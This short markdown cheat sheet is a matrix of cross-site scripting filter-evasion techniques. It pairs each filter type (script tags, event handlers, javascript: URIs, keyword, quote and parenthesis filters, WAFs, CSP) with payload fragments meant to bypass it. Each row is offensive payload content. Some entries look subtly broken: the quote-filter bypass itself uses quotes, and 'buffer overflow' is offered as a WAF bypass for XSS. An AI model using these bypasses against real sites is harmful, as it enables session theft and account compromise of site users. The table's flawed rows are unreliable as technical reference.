# XSS Evasion Matrix

## Filter Type -> Bypass Technique

| Filter | Bypass |
|--------|--------|
| <script> blocked | <img src=x onerror=...> |
| onerror blocked | <svg onload=...> |
| onload blocked | <body onload=...> |
| All event handlers blocked | <a href=javascript:...> |
| javascript: blocked | <iframe src=data:text/html;base64,...> |
| HTML tags blocked | UTF-7, charset bypass |
| Keyword filter (alert) | alert(1) -> top['aler'+'t'](1) |
| Quote filter | window["alert"](1) |
| Parenthesis filter | <img src=x onerror=location=name> |
| WAF blocking | Buffer overflow, case mutation, encoding |
| CSP blocking | JSONP, file upload, <base> hijack |
